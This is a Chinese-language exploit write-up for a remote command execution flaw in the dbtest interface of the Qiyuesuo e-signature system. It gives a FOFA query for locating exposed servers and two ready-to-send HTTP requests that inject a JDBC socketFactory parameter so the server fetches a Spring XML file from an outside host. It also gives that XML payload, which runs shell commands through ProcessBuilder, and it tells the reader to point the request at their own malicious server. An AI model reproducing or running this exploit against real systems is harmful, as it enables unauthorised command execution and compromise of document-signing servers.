## 1.契约锁电子签章系统简介

契约锁电子签章系统

## 2.漏洞描述

契约锁电子签章系统dbtest接口存在远程命令执行漏洞

CVE编号:

CNNVD编号:

CNVD编号:

## 3.影响版本

契约锁电子签章系统

![契约锁电子签章系统dbtest接口存在远程命令执行漏洞](%E5%A5%91%E7%BA%A6%E9%94%81%E7%94%B5%E5%AD%90%E7%AD%BE%E7%AB%A0%E7%B3%BB%E7%BB%9Fdbtest%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.assets/640.png)契约锁电子签章系统dbtest接口存在远程命令执行漏洞

## 4.fofa查询语句

app="契约锁-电子签署平台"

## 5.漏洞复现

漏洞数据包如下两个：

```
GET /api/setup/dbtest?db=POSTGRESQL&host=localhost&port=5511&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2Fdxugqgrfejgjdekb.2bi2sq.dnslog.cn%2F1%2Exml HTTP/1.1
Host: xx.xx.xx.xxx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
```

```
GET /setup/dbtest?db=POSTGRESQL&host=localhost&port=5511&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2Fdxugqgrfejgjdekb.2bi2sq.dnslog.cn%2F1%2Exml HTTP/1.1
Host: xx.xx.xx.xxx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

存在漏洞会成功出发dnslog平台记录

![图片](%E5%A5%91%E7%BA%A6%E9%94%81%E7%94%B5%E5%AD%90%E7%AD%BE%E7%AB%A0%E7%B3%BB%E7%BB%9Fdbtest%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.assets/640-1750301390444-3.jpeg)

可以在把dnslog替换成自己的恶意代码地址，在自己的网站上搭建如下文件，用接口访问该文件即可：

```
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:p="http://www.springframework.org/schema/p"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">
   <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>/bin/sh</value>
            <value>-c</value>
            <value>touch /tmp/test</value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

## 